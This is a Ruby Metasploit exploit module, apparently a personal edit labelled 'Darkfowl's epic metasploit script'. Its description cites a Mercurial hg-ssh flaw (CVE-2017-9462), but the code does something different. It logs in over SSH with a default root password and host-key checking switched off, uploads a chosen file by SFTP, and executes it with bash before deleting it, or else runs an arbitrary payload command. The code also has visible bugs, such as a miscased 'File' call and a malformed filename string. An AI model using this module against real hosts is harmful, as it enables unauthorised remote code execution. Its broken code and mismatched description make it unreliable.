  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'net/sftp'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Darkfowl's epic metasploit script",
      'Description'    => %q{
        This module takes advantage of custom hg-ssh wrapper implementations that don't
        adequately validate parameters passed to the hg binary, allowing users to trigger a
        Python Debugger session, which allows arbitrary Python code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 
        [
          'claudijd',
        ],
      'References'     =>
        [
          [ 'CVE', '2017-9462' ],
          ['URL',   'https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29']
        ],
      'DefaultOptions' =>
        {
          'Payload' => 'cmd/unix/generic',
		  'cmd' 	=> 'echo hi'
        },
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [ ['Automatic', {}] ],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 18 2017",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptString.new('USERNAME', [ true, 'The username for authentication', 'root' ]),
        OptString.new('PASSWORD', [ true, 'The password for authentication', 'cseclabs']),
        OptString.new('REMOTELOCATION', [ false, 'Where the file will go', '']),
        OptString.new('LOCALLOCATION', [ false, 'Where the file is from', ''])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def remote_location
    datastore['REMOTELOCATION']
  end

  def local_location
    datastore['LOCALLOCATION']
  end
  def dst_path
  	File.dirname(remote_location)
	end

  def exploit
    factory = ssh_socket_factory
    ssh_options = {
      :auth_methods    => ['password', 'keyboard-interactive'],
      :port            => rport,
      :use_agent       => false,
      :config          => false,
      :password        => password,
      :proxy           => factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    ssh_options.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    print_status("#{rhost}:#{rport} - Attempting to login...")

    begin
      sftp = nil
      ssh = nil

      if local_location != ''
          sftp = Net::SFTP.start(rhost, username, ssh_options)
        
      end

      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh = Net::SSH.start(rhost, username, ssh_options)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end
	
   if sftp && local_location != ''
      print_good("File transfer established.")
	  result = ssh.exec! ("mkdir -p " + dst_path) 
	  print_status result
	  print_good(remote_location)
	  extention = file.extname(local_location)
	  filename = "#{Rex::Text.rand_text_alpha(8)} + extention)"
	  remote_location = remote_location + filename
     	sftp.upload!(local_location, remote_location)
      if ssh
        print_good("SSH connection is established.")
        result = ssh.exec! ("chmod +x  " + remote_location) 
        print_status result
        result = ssh.exec! ("bash " + remote_location )
        print_status result
		result = ssh.exec! ("rm -rf " + remote_location )
        print_status result
      end

    

    elsif ssh
      print_good("SSH connection is established.")
      result = ssh.exec! "#{payload.encoded}\n"
      print_status result
     end
  end
end
